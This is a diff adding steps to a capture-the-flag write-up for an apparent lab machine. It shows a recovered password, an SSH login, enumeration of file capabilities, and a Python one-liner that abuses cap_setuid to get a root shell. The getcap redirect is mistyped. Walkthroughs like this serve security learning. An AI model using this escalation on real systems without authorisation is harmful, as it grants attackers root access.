@@ -145,9 +145,36 @@ QUIT
 
 > Password: Buck3tH4TF0RM3! 
 
+#
+
 So now, with this information, we're going to do either an SSH or an FTP connection. I prefer SSH because the SSH shell is more stable than FTP.
 
 ```bash
 ssh nathan@10.10.10.245
 ```
 This will give us the user flag in the `/home/nathan/` directory.
+
+#
+
+Let's do a: 
+`getcap -r / 2</dev/null/`
+It will show us the following:
+```bash
+
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+```
+
+Now, to escalate privileges, we just need to enter a console command that will make us root. Knowing that we did `getcap -r / 2</dev/null/`, and that the path tells us about the cap_setuid, we need to add a command that will allow us to escalate privileges.
+```bash
+
+python3.8 -c 'import os; os.setuid(0); os.system("bash")'
+```
+
+Entering this command will grant us root privileges. In `setuid`, a value of 0 signifies being the administrator or superuser.
+
+The `bash` command is used to switch the user from Nathan to root. Now you can have the root flag in /root.
+
